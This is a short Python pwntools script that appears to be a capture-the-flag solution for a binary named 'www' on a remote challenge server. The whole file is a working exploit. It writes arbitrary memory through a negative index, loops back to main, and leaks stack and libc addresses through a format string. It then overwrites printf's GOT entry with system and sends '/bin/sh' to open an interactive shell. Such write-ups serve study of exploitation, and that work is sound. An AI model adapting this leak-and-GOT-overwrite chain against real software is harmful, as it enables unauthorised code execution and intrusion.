from pwn import *

p = remote('challenges1.hexionteam.com', 3002) #

elf = ELF('./www')
main_func = elf.functions['main'] 

def write(what, where, last=False):
	p.sendline('-7\n' + chr(len(what) + (0 if last else 1)))
	msg = b''
	for c in what:
		msg += str(where).encode() + b'\n' + bytes([c]) + b'\n'
		where += 1
	print(msg)
	p.send(msg)

# ret to ret (because io function alignment) and then to main, leak printf address and stack
write(p64(elf.got['printf']), 0x2d + 16)
write(p64(main_func.address), 0x2d + 8)
write(p64(main_func.address + main_func.size - 1), 0x2d) # ret
write(b"%10$llx %15$s\x00", 0, True) # LEAK


# process leaks
leak = p.recv().split()
buff_start = int(leak[0], 16) - 245
offset = buff_start - elf.got['printf']
printf_addr = int.from_bytes(leak[1], 'little')

lib = ELF('./libc')
sys_addr = printf_addr + (lib.functions['system'].address - lib.functions['printf'].address)
print(hex(buff_start), hex(printf_addr), hex(sys_addr), leak)

# write sys address into printf reloc table
write(p64(sys_addr)[:3], -offset)
write(b'/bin/sh\x00', 0, True)
p.interactive()
